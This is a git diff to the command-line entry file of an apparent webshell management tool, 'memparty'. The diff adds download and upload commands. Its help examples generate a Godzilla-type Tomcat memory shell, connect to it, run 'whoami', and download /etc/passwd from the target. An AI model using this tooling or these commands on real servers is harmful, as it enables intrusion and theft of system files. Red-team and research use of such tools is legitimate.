@@ -11,6 +11,7 @@ import { registerMcpCommand } from "./commands/mcp.js";
 import { registerParseClassNameCommand } from "./commands/parse-classname.js";
 import { registerProbeCommand } from "./commands/probe.js";
 import { registerTargetCommand } from "./commands/target.js";
+import { registerDownloadCommand, registerUploadCommand } from "./commands/transfer.js";
 import { registerVersionCommand } from "./commands/version.js";
 import { DEFAULT_API_URL, ENV_VAR } from "./core/config.js";
 import { startRepl } from "./repl.js";
@@ -37,6 +38,7 @@ Quick start:
   $ memparty gen -s Tomcat -t Godzilla -y Listener -p DefaultBase64 -o shell.class
   $ memparty connect -u http://192.0.2.1/shell.jsp -t godzilla --header-value my-secret-token
   $ memparty exec 192.0.2.1/godzilla --cmd whoami    # auto-saved by a successful connect
+  $ memparty download 192.0.2.1/godzilla /etc/passwd -o passwd
   $ memparty list                                  # saved targets
   $ memparty log                                   # recent operations
 
@@ -49,6 +51,8 @@ Every subcommand has its own examples: memparty <command> --help
   registerConfigCommand(program);
   registerConnectCommand(program);
   registerExecCommand(program);
+  registerDownloadCommand(program);
+  registerUploadCommand(program);
   registerTargetCommand(program);
   registerLogCommand(program);
   registerParseClassNameCommand(program);
